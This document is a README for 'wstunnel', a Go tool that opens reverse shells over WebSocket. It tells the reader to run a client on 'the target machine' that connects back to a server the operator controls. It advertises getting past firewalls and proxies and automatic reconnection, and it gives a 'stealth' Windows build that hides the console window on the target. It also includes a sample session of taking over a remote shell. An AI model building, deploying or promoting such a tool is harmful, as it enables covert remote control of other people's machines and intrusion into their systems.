# wstunnel

A WebSocket-based reverse shell/tunnel tool. It allows multiple clients to connect to a server via WebSocket and exposes a shell interface to the server.

## Features

- **WebSocket Transport**: Uses standard WebSocket protocol, which can bypass some firewall restrictions or proxies.
- **Reverse Shell**: Clients connect back to the server (useful for targets behind NAT).
- **Multi-Client Support**: The server can handle multiple client connections simultaneously.
- **Interactive Console**: Server provides a command-line interface to list and switch between connected clients.
- **Auto-Reconnection**: Clients automatically attempt to reconnect if the connection is lost.
- **Cross-Platform**: Works on Linux, macOS, and Windows.
  - Linux/macOS: Uses PTY for a fully interactive shell.
  - Windows: Uses `cmd.exe` with piped streams.

## Usage

### Server

Run the server on a machine with a public IP or accessible network address.

```bash
./wstunnel -s -addr :8080
```

Once started, you will enter the **Interactive Console**:

- `list`: Show all connected clients with their IDs (IP addresses).
- `use <Client_ID>`: Enter the interactive shell of a specific client.
- `help`: Show available commands.
- `exit`: Stop the server and exit.

**Example Session:**
```text
[*] WSTunnel Server Listening on :8080
[*] Waiting for clients...
wstunnel> 
[+] New Client Connected: 192.168.1.100:54321
> list
--- Connected Clients ---
[0] 192.168.1.100:54321
wstunnel> use 192.168.1.100:54321
[*] Entering interactive shell with 192.168.1.100:54321
[*] Press 'exit' to terminate shell (this will disconnect the client)
user@target:~$ whoami
user
user@target:~$ exit
[*] Session closed.
wstunnel> 
```

### Client

Run the client on the target machine to connect back to the server.

```bash
./wstunnel -c -addr <ServerIP>:8080
```

The client will keep trying to connect to the server. If the connection drops, it will retry every 5 seconds.

## Compilation

### Prerequisites

- Go 1.16+

### 1. Compile for Linux/macOS (Server/Client)

```bash
# For Linux
GOOS=linux GOARCH=amd64 go build -o wstunnel_linux main.go shell_nix.go

# For macOS
GOOS=darwin GOARCH=amd64 go build -o wstunnel_mac main.go shell_nix.go
```
*Note: Since `shell_nix.go` has `//go:build !windows`, standard `go build` on non-Windows systems works automatically.*

```bash
go build -o wstunnel main.go
```

### 2. Compile for Windows (Client)

To hide the console window on the target machine, use `-H=windowsgui`. It is recommended to omit this flag during testing to see error messages.

```bash
# Standard build
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o wstunnel.exe main.go shell_win.go

# Stealth build (Hidden Window)
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o wstunnel.exe main.go shell_win.go
```
